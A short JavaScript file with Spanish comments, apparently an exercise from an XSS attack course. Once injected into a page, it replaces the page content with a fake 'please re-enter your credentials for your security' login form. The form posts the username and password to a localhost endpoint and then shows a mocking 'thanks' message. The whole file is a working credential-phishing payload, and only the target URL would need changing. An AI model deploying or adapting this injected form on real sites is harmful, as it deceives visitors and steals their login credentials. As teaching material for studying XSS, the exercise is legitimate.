//Lo primero que hacemos es eliminar todo el contenido de la pagina
//que realmente se mostraria


function restaurar(){
	document.getElementById("div").innerHTML = 'Gracias majete'
}

div = document.getElementById("div")
div.innerHTML = 

'<p align="center">Por su seguridad, y pensando solo en usted, por favor introduzca de nuevo sus credenciales</p>'+
	
'<form action="http://localhost:8081/Ej08_XSS_EjemplosAtaque_Indeseables/peticion_inocente" method="post">'+

'<input type="hidden" name="accion" value="login"/>'+

'<table border="1" align="center">'+
'	<tr>'+
'	<td>Login</td>'+
'		<td>'+
'			<input type="text" name="login"/>'+
'		</td>'+
'	</tr>'+
'	<tr>'+
'		<td>Pw</td>'+
'		<td>'+
'			<input type="text" name="pw"/>'+
'		</td>'+
'	</tr>'+
'	<tr>'+
'		<td colspan="2" align="right">'+
'			<input type="submit" value="Entrar" onclick="restaurar()"/>'+
'		</td>'+
'	</tr>'+	
'</table>'+
'</form>'	



